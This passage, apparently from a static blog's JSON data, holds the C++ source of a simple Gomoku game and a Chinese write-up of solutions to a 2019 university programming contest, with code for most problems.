class=\"line\">\t\tmsg = getmouse();</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (msg.is_up())</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">/*if (flag)//flag标记是否开始游戏</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t&#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\tif (msg.x &gt;= 10 &amp;&amp; msg.x &lt;= 90 &amp;&amp; msg.y &gt;= 200 &amp;&amp; msg.y &lt;= 230)</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t&#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\tsetfillcolor(EGERGB(0, 0, 0));</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\tbar(10, 200, 90, 230);</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\tsetcolor(EGERGB(0, 0, 255));</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\tsetfont(20, 0, &quot;宋体&quot;);</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\txyprintf(10, 205, &quot;电脑先手&quot;);</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\tflag = false;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t&#125;*/</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (msg.x % <span class=\"number\">40</span> &lt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (msg.y % <span class=\"number\">40</span> &lt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (Play(msg.x / <span class=\"number\">40</span>, msg.y / <span class=\"number\">40</span>, turn % <span class=\"number\">2</span>))</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">if</span> (Checker())<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t\tAI();</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (msg.y % <span class=\"number\">40</span> &gt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (Play(msg.x / <span class=\"number\">40</span>, msg.y / <span class=\"number\">40</span> + <span class=\"number\">1</span>, turn % <span class=\"number\">2</span>))</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">if</span> (Checker())<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t\tAI();</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (msg.x % <span class=\"number\">40</span> &gt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (msg.y % <span class=\"number\">40</span> &lt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (Play(msg.x / <span class=\"number\">40</span> + <span class=\"number\">1</span>, msg.y / <span class=\"number\">40</span>, turn % <span class=\"number\">2</span>))</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">if</span> (Checker())<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t\tAI();</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (msg.y % <span class=\"number\">40</span> &gt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (Play(msg.x / <span class=\"number\">40</span> + <span class=\"number\">1</span>, msg.y / <span class=\"number\">40</span> + <span class=\"number\">1</span>, turn % <span class=\"number\">2</span>))</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">if</span> (Checker())<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t\tAI();</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (Checker())<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">GamePeople</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tkey = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(pos, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(pos));</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> turn = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tmouse_msg msg;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (; is_run();)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tmsg = getmouse();</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (msg.is_up())</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (msg.x % <span class=\"number\">40</span> &lt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (msg.y % <span class=\"number\">40</span> &lt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (Play(msg.x / <span class=\"number\">40</span>, msg.y / <span class=\"number\">40</span>, turn % <span class=\"number\">2</span>))</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (msg.y % <span class=\"number\">40</span> &gt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (Play(msg.x / <span class=\"number\">40</span>, msg.y / <span class=\"number\">40</span> + <span class=\"number\">1</span>, turn % <span class=\"number\">2</span>))</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (msg.x % <span class=\"number\">40</span> &gt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (msg.y % <span class=\"number\">40</span> &lt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (Play(msg.x / <span class=\"number\">40</span> + <span class=\"number\">1</span>, msg.y / <span class=\"number\">40</span>, turn % <span class=\"number\">2</span>))</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (msg.y % <span class=\"number\">40</span> &gt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (Play(msg.x / <span class=\"number\">40</span> + <span class=\"number\">1</span>, msg.y / <span class=\"number\">40</span> + <span class=\"number\">1</span>, turn % <span class=\"number\">2</span>))</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (Checker())<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">Menu</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tsetcolor(EGERGB(<span class=\"number\">255</span>, <span class=\"number\">45</span>, <span class=\"number\">50</span>));</span><br><span class=\"line\">\tsetfont(<span class=\"number\">130</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;华文新魏&quot;</span>);</span><br><span class=\"line\">\txyprintf(<span class=\"number\">150</span>, <span class=\"number\">60</span>, <span class=\"string\">&quot;五  子  棋&quot;</span>);</span><br><span class=\"line\">\tsetbkcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">255</span>));</span><br><span class=\"line\">\tsetfillcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">122</span>, <span class=\"number\">204</span>));</span><br><span class=\"line\">\tbar(<span class=\"number\">300</span>, <span class=\"number\">230</span>, <span class=\"number\">500</span>, <span class=\"number\">280</span>);</span><br><span class=\"line\">\tbar(<span class=\"number\">300</span>, <span class=\"number\">300</span>, <span class=\"number\">500</span>, <span class=\"number\">350</span>);</span><br><span class=\"line\">\tbar(<span class=\"number\">300</span>, <span class=\"number\">370</span>, <span class=\"number\">500</span>, <span class=\"number\">420</span>);</span><br><span class=\"line\">\tsetbkmode(TRANSPARENT);</span><br><span class=\"line\">\tsetfont(<span class=\"number\">40</span>, <span class=\"number\">15</span>, <span class=\"string\">&quot;华文楷体&quot;</span>);</span><br><span class=\"line\">\tsetcolor(EGERGB(<span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>));</span><br><span class=\"line\">\tsetfontbkcolor(EGERGB(<span class=\"number\">30</span>, <span class=\"number\">30</span>, <span class=\"number\">130</span>));</span><br><span class=\"line\">\touttextxy(<span class=\"number\">320</span>, <span class=\"number\">235</span>, <span class=\"string\">&quot;人机对战&quot;</span>);</span><br><span class=\"line\">\touttextxy(<span class=\"number\">320</span>, <span class=\"number\">305</span>, <span class=\"string\">&quot;好友对战&quot;</span>);</span><br><span class=\"line\">\touttextxy(<span class=\"number\">320</span>, <span class=\"number\">375</span>, <span class=\"string\">&quot;退出游戏&quot;</span>);</span><br><span class=\"line\">\tsetfont(<span class=\"number\">30</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;华文楷体&quot;</span>);</span><br><span class=\"line\">\touttextxy(<span class=\"number\">230</span>, <span class=\"number\">480</span>, <span class=\"string\">&quot;制作人：计实验17-1郭永航&quot;</span>);</span><br><span class=\"line\">\tsetfont(<span class=\"number\">20</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;方正舒体&quot;</span>);</span><br><span class=\"line\">\tsetcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\touttextxy(<span class=\"number\">190</span>, <span class=\"number\">600</span>, <span class=\"string\">&quot;Copyright (C) 2018 Gomoku. All Rights Reserved.&quot;</span>);</span><br><span class=\"line\">\tmouse_msg msg;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (; is_run();)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tmsg = getmouse();</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (msg.is_up())</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (msg.x &gt;= <span class=\"number\">300</span> &amp;&amp; msg.x &lt;= <span class=\"number\">500</span> &amp;&amp; msg.y &gt;= <span class=\"number\">230</span> &amp;&amp; msg.y &lt;= <span class=\"number\">280</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tcleardevice();</span><br><span class=\"line\">\t\t\t\tChessBoard();</span><br><span class=\"line\">\t\t\t\tGameAI();</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (msg.x &gt;= <span class=\"number\">300</span> &amp;&amp; msg.x &lt;= <span class=\"number\">500</span> &amp;&amp; msg.y &gt;= <span class=\"number\">300</span> &amp;&amp; msg.y &lt;= <span class=\"number\">350</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tcleardevice();</span><br><span class=\"line\">\t\t\t\tChessBoard();</span><br><span class=\"line\">\t\t\t\tGamePeople();</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (msg.x &gt;= <span class=\"number\">300</span> &amp;&amp; msg.x &lt;= <span class=\"number\">500</span> &amp;&amp; msg.y &gt;= <span class=\"number\">370</span> &amp;&amp; msg.y &lt;= <span class=\"number\">420</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tclosegraph();</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">Choice</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tsetfillcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\tbar(<span class=\"number\">10</span>, <span class=\"number\">150</span>, <span class=\"number\">90</span>, <span class=\"number\">180</span>);</span><br><span class=\"line\">\tbar(<span class=\"number\">10</span>, <span class=\"number\">200</span>, <span class=\"number\">90</span>, <span class=\"number\">230</span>);</span><br><span class=\"line\">\tsetcolor(EGERGB(<span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>));</span><br><span class=\"line\">\tsetfont(<span class=\"number\">20</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;宋体&quot;</span>);</span><br><span class=\"line\">\txyprintf(<span class=\"number\">10</span>, <span class=\"number\">155</span>, <span class=\"string\">&quot;再来一局&quot;</span>);</span><br><span class=\"line\">\txyprintf(<span class=\"number\">10</span>, <span class=\"number\">205</span>, <span class=\"string\">&quot;返回菜单&quot;</span>);</span><br><span class=\"line\">\tmouse_msg msg;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (; is_run();)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tmsg = getmouse();</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (msg.is_up())</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (msg.x &gt;= <span class=\"number\">10</span> &amp;&amp; msg.x &lt;= <span class=\"number\">90</span> &amp;&amp; msg.y &gt;= <span class=\"number\">150</span> &amp;&amp; msg.y &lt;= <span class=\"number\">180</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tcleardevice();</span><br><span class=\"line\">\t\t\t\tChessBoard();</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (key)GamePeople();</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> GameAI();</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (msg.x &gt;= <span class=\"number\">10</span> &amp;&amp; msg.x &lt;= <span class=\"number\">90</span> &amp;&amp; msg.y &gt;= <span class=\"number\">200</span> &amp;&amp; msg.y &lt;= <span class=\"number\">230</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tcleardevice();</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (Menu())<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tsetinitmode(INIT_RENDERMANUAL);</span><br><span class=\"line\">\tinitgraph(<span class=\"number\">800</span>, <span class=\"number\">640</span>);</span><br><span class=\"line\">\tsetcaption(<span class=\"string\">&quot;五子棋&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (Menu())<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (!Choice());</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"河南理工大学第九届算法程序设计大赛题解","date":"2019-04-02T10:28:10.000Z","mathjax":true,"abbrlink":"ab3ec9eb","_content":"# 热身赛\n## A.三玖天下第一\n题目链接: https://hpuoj.com/contest/18/problem/A/\n思路: 很水的一道题, $map$ 统计出现次数最多的数字,判断一下输出就行了.\n代码:\n```\n#include<bits/stdc++.h>\nusing namespace std;\nint main()\n{\n\tstring s;\n\tmap<char,int>M;\n\tcin>>s;\n\tint ans=0;\n\tfor(int i=0;i<s.length();i++)\n\t\tM[s[i]]++;\n\tfor(int i='0';i<='9';i++)\n\t\tif(M[i]>M[ans])ans=i;\n\tif(ans=='0')cout<<\"Five equal parts.\"<<endl;\n\telse if(ans=='1')cout<<\"One flower gathers people.\"<<endl;\n\telse if(ans=='2')cout<<\"The second is very color.\"<<endl;\n\telse if(ans=='3')cout<<\"San Jiu tian xia di yi!\"<<endl;\n\telse if(ans=='4')cout<<\"Four leaves kawaii.\"<<endl;\n\telse cout<<\"May daughter.\"<<endl;\n\treturn 0;\n}\n```\n\n<!--more-->\n## B.权力的游戏\n题目链接: https://hpuoj.com/contest/18/problem/B/\n思路: 仍旧是 $map$ 统计每个数字出现次数,出现次数为奇数的输出一下就行了.\n代码:\n```\n#include<bits/stdc++.h>\nusing namespace std;\nint main()\n{\n\tint N,flag=0;\n\tmap<int,int>M;\n\twhile(cin>>N)M[N]++;\n\tmap<int,int>::iterator it;\n\tfor(it=M.begin();it!=M.end();it++)\n\t{\n\t\tif(it->second%2)\n\t\t{\n\t\t\tif(flag==0)\n\t\t\t{\n\t\t\t\tcout<<it->first;\n\t\t\t\tflag=1;\n\t\t\t}\n\t\t\telse cout<<' '<<it->first;\n\t\t}\n\t}\n\tcout<<endl;\n\treturn 0;\n}\n```\n\n# 正式赛\n## A.Asia区域赛\n题目链接: https://hpuoj.com/contest/16/problem/A/\n思路: 大水题一个,计算奖牌个数=29金+59银+87铜+11最快解题+1最佳女队+1顽强拼搏=187个,输出187即可.\n代码:\n```\n#include<bits/stdc++.h>\ntypedef long long ll;\nusing namespace std;\nint main()\n{\n\tcout<<187<<endl;\n\treturn 0;\n}\n```\n\n## B.Asia区域制\n题目链接: https://hpuoj.com/contest/16/problem/B/\n思路: 二进制转十六进制,每四位转化一下输出即可,注意要先转化前面不足四位的.\n代码:\n```\n#include<bits/stdc++.h>\ntypedef long long ll;\nusing namespace std;\nchar x[20]=\"0123456789abcdef\";\nstring s;\nint POW(int a,int b)\n{\n\tint ans=1;\n\tfor(int i=0;i<b;i++)\n\t\tans*=a;\n\treturn ans;\n}\nint main()\n{\n\tint T,l,ans;\n\tcin>>T;\n\twhile(T--)\n\t{\n\t\tans=0;\n\t\tcin>>s;\n\t\tl=s.length();\n\t\tfor(int i=l%4-1;i>=0;i--)\n\t\t\tif(s[i]=='1')\n\t\t\tans+=POW(2,l%4-i-1);\n\t\tif(l%4)cout<<x[ans];\n\t\tfor(int i=l%4;i<l;i++)\n\t\t{\n\t\t\tans=0;\n\t\t\tfor(int j=0;j<4;j++)\n\t\t\t\tif(s[i+j]=='1')\n\t\t\t\tans+=POW(2,3-j);\n\t\t\tcout<<x[ans];\n\t\t\ti+=3;\n\t\t}\n\t\tcout<<endl;\n\t}\n\treturn 0;\n}\n```\n\n## C.Asia区域宫\n题目链接: https://hpuoj.com/contest/16/problem/C/\n思路: 注意加粗字体 **\"障碍物在迷宫中不能同行且不能同列\"**,说明只有把与副对角线平行的路线堵死之后才输出 No ,其余情况输出皆为 2*$n$-2.\n代码:\n```\n代码暂无\n```\n\n## D.Asia区域阵\n题目链接: https://hpuoj.com/contest/16/problem/D/\n思路: 思路暂无\n代码:\n```\n代码暂无\n```\n\n## E.Mo的游戏\n题目链接: https://hpuoj.com/contest/16/problem/E/\n思路: $map$记录相同字符之间的最短距离,建一个数组记录此字符上次出现的位置.for循环遍历一遍即可.\n代码:\n```\n#include<bits/stdc++.h>\ntypedef long long ll;\nusing namespace std;\nint a[200];\nint M[200];\nint main()\n{\n\tstring s;\n\tmemset(M,-1,sizeof(M));\n\tcin>>s;\n\tfor(int i=0;i<s.length();i++)\n\t{\n\t\tif(M[s[i]]==-1)\n\t\t{\n\t\t\tM[s[i]]++;\n\t\t\ta[s[i]]=i+1;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tif(M[s[i]]==0)M[s[i]]=i+1-a[s[i]];\n\t\t\tif(i+1-a[s[i]]<M[s[i]])\n\t\t\t\tM[s[i]]=i+1-a[s[i]];\n\t\t\ta[s[i]]=i+1;\n\t\t}\n\t}\n\tfor(char i='a';i<='z';i++)\n\t\tif(M[i]==0)cout<<i<<':'<<0<<endl;\n\t\telse if(M[i]!=-1)cout<<i<<':'<<s.length()-M[i]<<endl;\n\tfor(char i='A';i<='Z';i++)\n\t\tif(M[i]==0)cout<<i<<':'<<0<<endl;\n\t\telse if(M[i]!=-1)cout<<i<<':'<<s.length()-M[i]<<endl;\n\treturn 0;\n}\n```\n\n## F.Mo的极限\n题目链接: https://hpuoj.com/contest/16/problem/F/\n思路: 思路暂无\n代码:\n```\n代码暂无\n```\n\n## G.Mo的数学\n题目链接: https://hpuoj.com/contest/16/problem/G/\n思路: 分解质因数,即$M$的因子的倍数都不和$M$互质,其余的都和$M$互质,此为暴力做法.正解为容斥原理,暂无.\n代码:\n```\n#include<bits/stdc++.h>\n#define MOD 1000000007\ntypedef long long ll;\nusing namespace std;\nbool zhi[1000020];\nint N,M;\nvoid gcd(int n)\n{\n\tfor(int i=2;i*i<=n;i++)\n\t{\n\t\tif(n%i==0)\n\t\t{\n\t\t\tfor(int j=1;j*i<=N;j++)\n\t\t\t\tzhi[i*j]=1;\n\t\t\tfor(int j=1;j*(n/i)<=N;j++)\n\t\t\t\tzhi[(n/i)*j]=1;\n\t\t}\n\t}\n\tfor(int j=1;j*n<=N;j++)\n\t\tzhi[j*n]=1;\n}\nint main()\n{\n\twhile(cin>>N>>M)\n\t{\n\t\tll ans=1;\n\t\tmemset(zhi,0,sizeof(zhi));\n\t\tgcd(M);\n\t\tfor(int i=2;i<=N;i++)\n\t\t\tif(!zhi[i])ans=ans*i%MOD;\n\t\tcout<<ans<<endl;\n\t}\n\treturn 0;\n}\n\n```\n\n## H.Mo的面积\n题目链接: https://hpuoj.com/contest/16/problem/H/\n思路: 两个矩形右边线中$x$值最小的减去两个矩形左边线中$x$值最大的即为重合矩形在$x$轴方向的长度;两个矩形上边线中$y$值最小的减去两个矩形下边线中$y$值最大的即为重合矩形在$y$轴方向的长度.如果其中一个值小于或等于0,则重合面积为0,否则,即为其乘积.求两矩形总面积减去重合部分面积即为答案.\n代码:\n```\n#include<bits/stdc++.h>\ntypedef long long ll;\nusing namespace std;\nint main()\n{\n\tint a[2][2],b[2][2],x,y;\n\tfor(int i=0;i<2;i++)\n\t\tfor(int j=0;j<2;j++)\n\t\t\tcin>>a[i][j];\n\tfor(int i=0;i<2;i++)\n\t\n\t\tfor(int j=0;j<2;j++)\n\t\t\tcin>>b[i][j];\n\tx=min(a[1][0],b[1][0])-max(a[0][0],b[0][0]);\n\ty=min(a[1][1],b[1][1])-max(a[0][1],b[0][1]);\n\tint s=(a[1][1]-a[0][1])*(a[1][0]-a[0][0])+(b[1][1]-b[0][1])*(b[1][0]-b[0][0]);\n\tif(x*y>0)s-=x*y;\n\tcout<<s<<endl;\n\treturn 0;\n}\n```\n\n## I.安全距离\n题目链接: https://hpuoj.com/contest/16/problem/I/\n思路: 思路暂无\n代码:\n```\n代码暂无\n```\n\n## J.简单递归\n题目链接: https://hpuoj.com/contest/16/problem/J/\n思路: 讲题目代码递归转化为非递归即可.\n代码:\n```\n#include<bits/stdc++.h>\ntypedef long long ll;\nusing namespace std;\nconst int MOD = (int)1e9 + 7;\nint a[1000020];\nvoid init()\n{\n\ta[1]=a[2]=1;\n\tfor(int i=3;i<=1000000;i++)\n\t\ta[i]=((a[i-1]<<1)%MOD+(a[i-2]>>1)%MOD)%MOD;\n}\nint main()\n{\n\tinit();\n\tint T,N;\n\tcin>>T;\n\twhile(T--)\n\t{\n\t\tcin>>N;\n\t\tcout<<a[N]<<endl;\n\t}\n\treturn 0;\n}\n```\n\n## K.高度期望\n题目链接: https://hpuoj.com/contest/16/problem/K/\n思路: 贪心求解,先对树高进行排序,再从低到高遍历即可.\n代码:\n```\n#include<bits/stdc++.h>\ntypedef long long ll;\nusing namespace std;\nint main()\n{\n\tint N,M,a[100020];\n\tll ans=0,res=0;\n\tcin>>N>>M;\n\tfor(int i=0;i<N;i++)\n\t{\n\t\tcin>>a[i];\n\t\tans+=a[i];\n\t}\n\tsort(a,a+N);\n\tfor(int i=0;i<N;i++)\n\t{\n\t\tif(ans>=M*N)break;\n\t\tans+=1000-a[i];\n\t\tres++;\n\t}\n\tcout<<res<<endl;\n\treturn 0;\n}\n```\n\n## L.最优规划\n题目链接: https://hpuoj.com/contest/16/problem/L/\n思路: 思路暂无\n代码:\n```\n代码暂无\n```\n","source":"_posts/HPU第九届校赛.md","raw":"---\ntitle: 河南理工大学第九届算法程序设计大赛题解\ndate: 2019-04-02 18:28:10\ncategories:\n  - Algorithm\ntags: 题解\nmathjax: true\nabbrlink: ab3ec9eb\n---\n# 热身赛\n## A.三玖天下第一\n题目链接: https://hpuoj.com/contest/18/problem/A/\n思路: 很水的一道题, $map$ 统计出现次数最多的数字,判断一下输出就行了.\n代码:\n```\n#include<bits/stdc++.h>\nusing namespace std;\nint main()\n{\n\tstring s;\n\tmap<char,int>M;\n\tcin>>s;\n\tint ans=0;\n\tfor(int i=0;i<s.length();i++)\n\t\tM[s[i]]++;\n\tfor(int i='0';i<='9';i++)\n\t\tif(M[i]>M[ans])ans=i;\n\tif(ans=='0')cout<<\"Five equal parts.\"<<endl;\n\telse if(ans=='1')cout<<\"One flower gathers people.\"<<endl;\n\telse 